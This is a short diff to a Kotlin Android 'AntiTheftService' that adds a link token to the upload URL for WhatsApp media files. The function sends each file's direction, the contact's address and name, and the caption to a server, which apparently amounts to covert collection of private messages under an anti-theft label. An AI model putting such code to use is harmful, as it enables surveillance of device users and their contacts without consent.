@@ -702,7 +702,8 @@ class AntiTheftService : LifecycleService() {
 
     // Upload a WhatsApp media file and notify server which conversation it belongs to
     private fun uploadWhatsAppMediaInternal(file: File, type: String, isSent: Boolean, address: String, name: String, caption: String) {
-        val path = "/upload/whatsapp-media/$deviceId"
+        val token = linkToken.trim()
+        val path = "/upload/whatsapp-media/$deviceId${if (token.isNotEmpty()) "?linkToken=$token" else ""}"
         val serverUrl = getUploadUrl(path)
         Log.d("AntiTheftService", "Uploading WhatsApp media to: $serverUrl")
 
